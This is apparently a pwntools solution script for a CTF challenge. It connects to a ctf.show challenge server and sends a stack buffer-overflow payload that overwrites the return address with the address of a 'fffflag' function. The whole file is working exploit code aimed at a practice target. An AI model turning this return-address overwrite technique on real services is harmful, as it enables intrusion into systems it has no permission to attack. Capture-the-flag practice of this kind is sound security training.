from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28263)
elf = ELF('./pwn')
cat_flag = elf.sym['fffflag']
io.sendlineafter('Your choice:','1')
io.sendlineafter('username:','bit')
io.recv()
payload  = cyclic(0x14+4)+p32(cat_flag) + 'a'*234 
io.sendline(payload)
io.interactive()
